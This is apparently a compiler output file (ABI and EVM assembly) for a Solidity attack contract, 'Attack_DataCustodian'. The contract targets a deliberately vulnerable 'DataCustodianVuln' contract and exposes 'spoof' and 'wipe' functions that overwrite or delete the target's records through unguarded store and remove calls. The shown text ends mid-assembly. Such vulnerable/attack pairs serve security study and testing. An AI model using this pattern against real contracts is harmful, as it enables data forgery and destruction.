{
	"D/Data Custodian/Data Custodian.sol": {
		"Attack_DataCustodian": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract DataCustodianVuln",
							"name": "_t",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "id",
							"type": "uint256"
						},
						{
							"internalType": "bytes",
							"name": "fake",
							"type": "bytes"
						}
					],
					"name": "spoof",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract DataCustodianVuln",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "id",
							"type": "uint256"
						}
					],
					"name": "wipe",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"D/Data Custodian/Data Custodian.sol\":2628:2990  contract Attack_DataCustodian {... */\n  mstore(0x40, 0x80)\n    /* \"D/Data Custodian/Data Custodian.sol\":2701:2751  constructor(DataCustodianVuln _t) { target = _t; } */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"D/Data Custodian/Data Custodian.sol\":2746:2748  _t */\n  dup1\n    /* \"D/Data Custodian/Data Custodian.sol\":2737:2743  target */\n  0x00\n  dup1\n    /* \"D/Data Custodian/Data Custodian.sol\":2737:2748  target = _t */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"D/Data Custodian/Data Custodian.sol\":2701:2751  constructor(DataCustodianVuln _t) { target = _t; } */\n  pop\n    /* \"D/Data Custodian/Data Custodian.sol\":2628:2990  contract Attack_DataCustodian {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:688   */\ntag_12:\n    /* \"#utility.yul\":629:636   */\n  0x00\n    /* \"#utility.yul\":658:682   */\n  tag_23\n    /* \"#utility.yul\":676:681   */\n  dup3\n    /* \"#utility.yul\":658:682   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":647:682   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:688   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":694:864   */\ntag_13:\n    /* \"#utility.yul\":791:839   */\n  tag_25\n    /* \"#utility.yul\":833:838   */\n  dup2\n    /* \"#utility.yul\":791:839   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":784:789   */\n  dup2\n    /* \"#utility.yul\":781:840   */\n  eq\n    /* \"#utility.yul\":771:858   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":854:855   */\n  0x00\n    /* \"#utility.yul\":851:852   */\n  dup1\n    /* \"#utility.yul\":844:856   */\n  revert\n    /* \"#utility.yul\":771:858   */\ntag_26:\n    /* \"#utility.yul\":694:864   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":870:1061   */\ntag_14:\n    /* \"#utility.yul\":951:956   */\n  0x00\n    /* \"#utility.yul\":982:988   */\n  dup2\n    /* \"#utility.yul\":976:989   */\n  mload\n    /* \"#utility.yul\":967:989   */\n  swap1\n  pop\n    /* \"#utility.yul\":998:1055   */\n  tag_28\n    /* \"#utility.yul\":1049:1054   */\n  dup2\n    /* \"#utility.yul\":998:1055   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":870:1061   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1067:1466   */\ntag_3:\n    /* \"#utility.yul\":1161:1167   */\n  0x00\n    /* \"#utility.yul\":1210:1212   */\n  0x20\n    /* \"#utility.yul\":1198:1207   */\n  dup3\n    /* \"#utility.yul\":1189:1196   */\n  dup5\n    /* \"#utility.yul\":1185:1208   */\n  sub\n    /* \"#utility.yul\":1181:1213   */\n  slt\n    /* \"#utility.yul\":1178:1297   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1216:1295   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1178:1297   */\ntag_30:\n    /* \"#utility.yul\":1336:1337   */\n  0x00\n    /* \"#utility.yul\":1361:1449   */\n  tag_32\n    /* \"#utility.yul\":1441:1448   */\n  dup5\n    /* \"#utility.yul\":1432:1438   */\n  dup3\n    /* \"#utility.yul\":1421:1430   */\n  dup6\n    /* \"#utility.yul\":1417:1439   */\n  add\n    /* \"#utility.yul\":1361:1449   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1351:1449   */\n  swap2\n  pop\n    /* \"#utility.yul\":1307:1459   */\n  pop\n    /* \"#utility.yul\":1067:1466   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"D/Data Custodian/Data Custodian.sol\":2628:2990  contract Attack_DataCustodian {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"D/Data Custodian/Data Custodian.sol\":2628:2990  contract Attack_DataCustodian {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xb38a1620\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe0d1e072\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"D/Data Custodian/Data Custodian.sol\":2919:2988  function wipe(uint256 id) external {... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n      tag_9\n      jump\t// in\n    tag_6:\n      stop\n        /* \"D/Data Custodian/Data Custodian.sol\":2664:2695  DataCustodianVuln public target */\n    tag_4:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"D/Data Custodian/Data Custodian.sol\":2791:2887  function spoof(uint256 id, bytes calldata fake) external {... */\n    tag_5:\n      tag_14\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      tag_17\n      jump\t// in\n    tag_14:\n      stop\n        /* \"D/Data Custodian/Data Custodian.sol\":2919:2988  function wipe(uint256 id) external {... */\n    tag_9:\n        /* \"D/Data Custodian/Data Custodian.sol\":2964:2970  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"D/Data Custodian/Data Custodian.sol\":2964:2977  target.remove */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x4cc82215\n        /* \"D/Data Custodian/Data Custodian.sol\":2978:2980  id */\n      dup3\n        /* \"D/Data Custodian/Data Custodian.sol\":2964:2981  target.remove(id) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n        /* \"D/Data Custodian/Data Custodian.sol\":2919:2988  function wipe(uint256 id) external {... */\n      pop\n      jump\t// out\n        /* \"D/Data Custodian/Data Custodian.sol\":2664:2695  DataCustodianVuln public target */\n    tag_11:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"D/Data Custodian/Data Custodian.sol\":2791:2887  function spoof(uint256 id, bytes calldata fake) external {... */\n    tag_17:\n        /* \"D/Data Custodian/Data Custodian.sol\":2858:2864  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"D/Data Custodian/Data Custodian.sol\":2858:2870  target.store */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfededdb5\n        /* \"D/Data Custodian/Data Custodian.sol\":2871:2873  id */\n      dup5\n        /* \"D/Data Custodian/Data Custodian.sol\":2875:2879  fake */\n      dup5\n      dup5\n        /* \"D/Data Custodian/Data Custodian.sol\":2858:2880  target.store(id, fake) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_25\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n        /* \"D/Data Custodian/Data Custodian.sol\":2791:2887  function spoof(uint256 id, bytes calldata fake) external {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_31:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":211:328   */\n    tag_32:\n        /* \"#utility.yul\":320:321   */\n      0x00\n        /* \"#utility.yul\":317:318   */\n      dup1\n        /* \"#utility.yul\":310:322   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_33:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_34:\n        /* \"#utility.yul\":490:514   */\n      tag_57\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_33\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_58\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_58:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_35:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_60\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_34\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_8:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_62\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_63\n      tag_31\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":766:885   */\n    tag_62:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_64\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_35\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1151   */\n    tag_36:\n        /* \"#utility.yul\":1062:1069   */\n      0x00\n        /* \"#utility.yul\":1102:1144   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1095:1100   */\n      dup3\n        /* \"#utility.yul\":1091:1145   */\n      and\n        /* \"#utility.yul\":1080:1145   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1151   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1157:1217   */\n    tag_37:\n        /* \"#utility.yul\":1185:1188   */\n      0x00\n        /* \"#utility.yul\":1206:1211   */\n      dup2\n        /* \"#utility.yul\":1199:1211   */\n      swap1\n      pop\n        /* \"#utility.yul\":1157:1217   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1223:1365   */\n    tag_38:\n        /* \"#utility.yul\":1273:1282   */\n      0x00\n        /* \"#utility.yul\":1306:1359   */\n      tag_68\n        /* \"#utility.yul\":1324:1358   */\n      tag_69\n        /* \"#utility.yul\":1333:1357   */\n      tag_70\n        /* \"#utility.yul\":1351:1356   */\n      dup5\n        /* \"#utility.yul\":1333:1357   */\n      tag_36\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1324:1358   */\n      tag_37\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1306:1359   */\n      tag_36\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1293:1359   */\n      swap1\n      pop\n        /* \"#utility.yul\":1223:1365   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1371:1497   */\n    tag_39:\n        /* \"#utility.yul\":1421:1430   */\n      0x00\n        /* \"#utility.yul\":1454:1491   */\n      tag_72\n        /* \"#utility.yul\":1485:1490   */\n      dup3\n        /* \"#utility.yul\":1454:1491   */\n      tag_38\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1441:1491   */\n      swap1\n      pop\n        /* \"#utility.yul\":1371:1497   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1503:1653   */\n    tag_40:\n        /* \"#utility.yul\":1577:1586   */\n      0x00\n        /* \"#utility.yul\":1610:1647   */\n      tag_74\n        /* \"#utility.yul\":1641:1646   */\n      dup3\n        /* \"#utility.yul\":1610:1647   */\n      tag_39\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1597:1647   */\n      swap1\n      pop\n        /* \"#utility.yul\":1503:1653   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1659:1838   */\n    tag_41:\n        /* \"#utility.yul\":1770:1831   */\n      tag_76\n        /* \"#utility.yul\":1825:1830   */\n      dup2\n        /* \"#utility.yul\":1770:1831   */\n      tag_40\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1765:1768   */\n      dup3\n        /* \"#utility.yul\":1758:1832   */\n      mstore\n        /* \"#utility.yul\":1659:1838   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1844:2114   */\n    tag_13:\n        /* \"#utility.yul\":1961:1965   */\n      0x00\n        /* \"#utility.yul\":1999:2001   */\n      0x20\n        /* \"#utility.yul\":1988:1997   */\n      dup3\n        /* \"#utility.yul\":1984:2002   */\n      add\n        /* \"#utility.yul\":1976:2002   */\n      swap1\n      pop\n        /* \"#utility.yul\":2012:2107   */\n      tag_78\n        /* \"#utility.yul\":2104:2105   */\n      0x00\n        /* \"#utility.yul\":2093:2102   */\n      dup4\n        /* \"#utility.yul\":2089:2106   */\n      add\n        /* \"#utility.yul\":2080:2086   */\n      dup5\n        /* \"#utility.yul\":2012:2107   */\n      tag_41\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":1844:2114   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2120:2237   */\n    tag_42:\n        /* \"#utility.yul\":2229:2230   */\n      0x00\n        /* \"#utility.yul\":2226:2227   */\n      dup1\n        /* \"#utility.yul\":2219:2231   */\n      revert\n        /* \"#utility.yul\":2243:2360   */\n    tag_43:\n        /* \"#utility.yul\":2352:2353   */\n      0x00\n        /* \"#utility.yul\":2349:2350   */\n      dup1\n        /* \"#utility.yul\":2342:2354   */\n      revert\n        /* \"#utility.yul\":2366:2483   */\n    tag_44:\n        /* \"#utility.yul\":2475:2476   */\n      0x00\n        /* \"#utility.yul\":2472:2473   */\n      dup1\n        /* \"#utility.yul\":2465:2477   */\n      revert\n        /* \"#utility.yul\":2502:3054   */\n    tag_45:\n        /* \"#utility.yul\":2559:2567   */\n      0x00\n        /* \"#utility.yul\":2569:2575   */\n      dup1\n        /* \"#utility.yul\":2619:2622   */\n      dup4\n        /* \"#utility.yul\":2612:2616   */\n      0x1f\n        /* \"#utility.yul\":2604:2610   */\n      dup5\n        /* \"#utility.yul\":2600:2617   */\n      add\n        /* \"#utility.yul\":2596:2623   */\n      slt\n        /* \"#utility.yul\":2586:2708   */\n      tag_83\n      jumpi\n        /* \"#utility.yul\":2627:2706   */\n      tag_84\n      tag_42\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":2586:2708   */\n    tag_83:\n        /* \"#utility.yul\":2740:2746   */\n      dup3\n        /* \"#utility.yul\":2727:2747   */\n      calldataload\n        /* \"#utility.yul\":2717:2747   */\n      swap1\n      pop\n        /* \"#utility.yul\":2770:2788   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":2762:2768   */\n      dup2\n        /* \"#utility.yul\":2759:2789   */\n      gt\n        /* \"#utility.yul\":2756:2873   */\n      iszero\n      tag_85\n      jumpi\n        /* \"#utility.yul\":2792:2871   */\n      tag_86\n      tag_43\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":2756:2873   */\n    tag_85:\n        /* \"#utility.yul\":2906:2910   */\n      0x20\n        /* \"#utility.yul\":2898:2904   */\n      dup4\n        /* \"#utility.yul\":2894:2911   */\n      add\n        /* \"#utility.yul\":2882:2911   */\n      swap2\n      pop\n        /* \"#utility.yul\":2960:2963   */\n      dup4\n        /* \"#utility.yul\":2952:2956   */\n      0x01\n        /* \"#utility.yul\":2944:2950   */\n      dup3\n        /* \"#utility.yul\":2940:2957   */\n      mul\n        /* \"#utility.yul\":2930:2938   */\n      dup4\n        /* \"#utility.yul\":2926:2958   */\n      add\n        /* \"#utility.yul\":2923:2964   */\n      gt\n        /* \"#utility.yul\":2920:3048   */\n      iszero\n      tag_87\n      jumpi\n        /* \"#utility.yul\":2967:3046   */\n      tag_88\n      tag_44\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2920:3048   */\n    tag_87:\n        /* \"#utility.yul\":2502:3054   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3060:3732   */\n    tag_16:\n        /* \"#utility.yul\":3139:3145   */\n      0x00\n        /* \"#utility.yul\":3147:3153   */\n      dup1\n        /* \"#utility.yul\":3155:3161   */\n      0x00\n        /* \"#utility.yul\":3204:3206   */\n      0x40\n        /* \"#utility.yul\":3192:3201   */\n      dup5\n        /* \"#utility.yul\":3183:3190   */\n      dup7\n        /* \"#utility.yul\":3179:3202   */\n      sub\n        /* \"#utility.yul\":3175:3207   */\n      slt\n        /* \"#utility.yul\":3172:3291   */\n      iszero\n      tag_90\n      jumpi\n        /* \"#utility.yul\":3210:3289   */\n      tag_91\n      tag_31\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":3172:3291   */\n    tag_90:\n        /* \"#utility.yul\":3330:3331   */\n      0x00\n        /* \"#utility.yul\":3355:3408   */\n      tag_92\n        /* \"#utility.yul\":3400:3407   */\n      dup7\n        /* \"#utility.yul\":3391:3397   */\n      dup3\n        /* \"#utility.yul\":3380:3389   */\n      dup8\n        /* \"#utility.yul\":3376:3398   */\n      add\n        /* \"#utility.yul\":3355:3408   */\n      tag_35\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":3345:3408   */\n      swap4\n      pop\n        /* \"#utility.yul\":3301:3418   */\n      pop\n        /* \"#utility.yul\":3485:3487   */\n      0x20\n        /* \"#utility.yul\":3474:3483   */\n      dup5\n        /* \"#utility.yul\":3470:3488   */\n      add\n        /* \"#utility.yul\":3457:3489   */\n      calldataload\n        /* \"#utility.yul\":3516:3534   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":3508:3514   */\n      dup2\n        /* \"#utility.yul\":3505:3535   */\n      gt\n        /* \"#utility.yul\":3502:3619   */\n      iszero\n      tag_93\n      jumpi\n        /* \"#utility.yul\":3538:3617   */\n      tag_94\n      tag_32\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":3502:3619   */\n    tag_93:\n        /* \"#utility.yul\":3651:3715   */\n      tag_95\n        /* \"#utility.yul\":3707:3714   */\n      dup7\n        /* \"#utility.yul\":3698:3704   */\n      dup3\n        /* \"#utility.yul\":3687:3696   */\n      dup8\n        /* \"#utility.yul\":3683:3705   */\n      add\n        /* \"#utility.yul\":3651:3715   */\n      tag_45\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":3633:3715   */\n      swap3\n      pop\n      swap3\n      pop\n        /* \"#utility.yul\":3428:3725   */\n      pop\n        /* \"#utility.yul\":3060:3732   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":3738:3856   */\n    tag_46:\n        /* \"#utility.yul\":3825:3849   */\n      tag_97\n        /* \"#utility.yul\":3843:3848   */\n      dup2\n        /* \"#utility.yul\":3825:3849   */\n      tag_33\n      jump\t// in\n    tag_97:\n        /* \"#utility.yul\":3820:3823   */\n      dup3\n        /* \"#utility.yul\":3813:3850   */\n      mstore\n        /* \"#utility.yul\":3738:3856   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3862:4084   */\n    tag_20:\n        /* \"#utility.yul\":3955:3959   */\n      0x00\n        /* \"#utility.yul\":3993:3995   */\n      0x20\n        /* \"#utility.yul\":3982:3991   */\n      dup3\n        /* \"#utility.yul\":3978:3996   */\n      add\n        /* \"#utility.yul\":3970:3996   */\n      swap1\n      pop\n        /* \"#utility.yul\":4006:4077   */\n      tag_99\n        /* \"#utility.yul\":4074:4075   */\n      0x00\n        /* \"#utility.yul\":4063:4072   */\n      dup4\n        /* \"#utility.yul\":4059:4076   */\n      add\n        /* \"#utility.yul\":4050:4056   */\n      dup5\n        /* \"#utility.yul\":4006:4077   */\n      tag_46\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3862:4084   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4090:4258   */\n    tag_47:\n        /* \"#utility.yul\":4173:4184   */\n      0x00\n        /* \"#utility.yul\":4207:4213   */\n      dup3\n        /* \"#utility.yul\":4202:4205   */\n      dup3\n        /* \"#utility.yul\":4195:4214   */\n      mstore\n        /* \"#utility.yul\":4247:4251   */\n      0x20\n        /* \"#utility.yul\":4242:4245   */\n      dup3\n        /* \"#utility.yul\":4238:4252   */\n      add\n        /* \"#utility.yul\":4223:4252   */\n      swap1\n      pop\n        /* \"#utility.yul\":4090:4258   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4264:4412   */\n    tag_48:\n        /* \"#utility.yul\":4362:4368   */\n      dup3\n        /* \"#utility.yul\":4357:4360   */\n      dup2\n        /* \"#utility.yul\":4352:4355   */\n      dup4\n        /* \"#utility.yul\":4339:4369   */\n      calldatacopy\n        /* \"#utility.yul\":4403:4404   */\n      0x00\n        /* \"#utility.yul\":4394:4400   */\n      dup4\n        /* \"#utility.yul\":4389:4392   */\n      dup4\n        /* \"#utility.yul\":4385:4401   */\n      add\n        /* \"#utility.yul\":4378:4405   */\n      mstore\n        /* \"#utility.yul\":4264:4412   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4418:4520   */\n    tag_49:\n        /* \"#utility.yul\":4459:4465   */\n      0x00\n        /* \"#utility.yul\":4510:4512   */\n      0x1f\n        /* \"#utility.yul\":4506:4513   */\n      not\n        /* \"#utility.yul\":4501:4503   */\n      0x1f\n        /* \"#utility.yul\":4494:4499   */\n      dup4\n        /* \"#utility.yul\":4490:4504   */\n      add\n        /* \"#utility.yul\":4486:4514   */\n      and\n        /* \"#utility.yul\":4476:4514   */\n      swap1\n      pop\n        /* \"#utility.yul\":4418:4520   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4548:4862   */\n    tag_50:\n        /* \"#utility.yul\":4644:4647   */\n      0x00\n        /* \"#utility.yul\":4665:4735   */\n      tag_104\n        /* \"#utility.yul\":4728:4734   */\n      dup4\n        /* \"#utility.yul\":4723:4726   */\n      dup6\n        /* \"#utility.yul\":4665:4735   */\n      tag_47\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":4658:4735   */\n      swap4\n      pop\n        /* \"#utility.yul\":4745:4801   */\n      tag_105\n        /* \"#utility.yul\":4794:4800   */\n      dup4\n        /* \"#utility.yul\":4789:4792   */\n      dup6\n        /* \"#utility.yul\":4782:4787   */\n      dup5\n        /* \"#utility.yul\":4745:4801   */\n      tag_48\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":4826:4855   */\n      tag_106\n        /* \"#utility.yul\":4848:4854   */\n      dup4\n        /* \"#utility.yul\":4826:4855   */\n      tag_49\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":4821:4824   */\n      dup5\n        /* \"#utility.yul\":4817:4856   */\n      add\n        /* \"#utility.yul\":4810:4856   */\n      swap1\n      pop\n        /* \"#utility.yul\":4548:4862   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4868:5307   */\n    tag_26:\n        /* \"#utility.yul\":5017:5021   */\n      0x00\n        /* \"#utility.yul\":5055:5057   */\n      0x40\n        /* \"#utility.yul\":5044:5053   */\n      dup3\n        /* \"#utility.yul\":5040:5058   */\n      add\n        /* \"#utility.yul\":5032:5058   */\n      swap1\n      pop\n        /* \"#utility.yul\":5068:5139   */\n      tag_108\n        /* \"#utility.yul\":5136:5137   */\n      0x00\n        /* \"#utility.yul\":5125:5134   */\n      dup4\n        /* \"#utility.yul\":5121:5138   */\n      add\n        /* \"#utility.yul\":5112:5118   */\n      dup7\n        /* \"#utility.yul\":5068:5139   */\n      tag_46\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":5186:5195   */\n      dup2\n        /* \"#utility.yul\":5180:5184   */\n      dup2\n        /* \"#utility.yul\":5176:5196   */\n      sub\n        /* \"#utility.yul\":5171:5173   */\n      0x20\n        /* \"#utility.yul\":5160:5169   */\n      dup4\n        /* \"#utility.yul\":5156:5174   */\n      add\n        /* 